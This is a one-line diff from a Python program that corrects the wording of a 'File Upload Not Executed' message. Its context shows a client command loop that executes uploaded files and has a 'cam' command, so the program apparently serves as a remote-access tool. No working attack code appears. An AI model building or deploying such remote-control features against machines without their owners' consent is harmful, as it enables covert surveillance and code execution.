@@ -154,7 +154,7 @@ while True:
         if df==True:
             activityOutput(client,'File Uploaded Successfully')
         else:
-            activityOutput(client,'File Uploaded Not Executed , maybe missed libraries<br>Try this cmd : <br><br>pip install requests<br><br>* or try use pip3')
+            activityOutput(client,'File Upload Not Executed , maybe missed libraries<br>Try this cmd : <br><br>pip install requests<br><br>* or try use pip3')
         newcmd=""
     if newcmd.startswith('cam')==True:
         try:
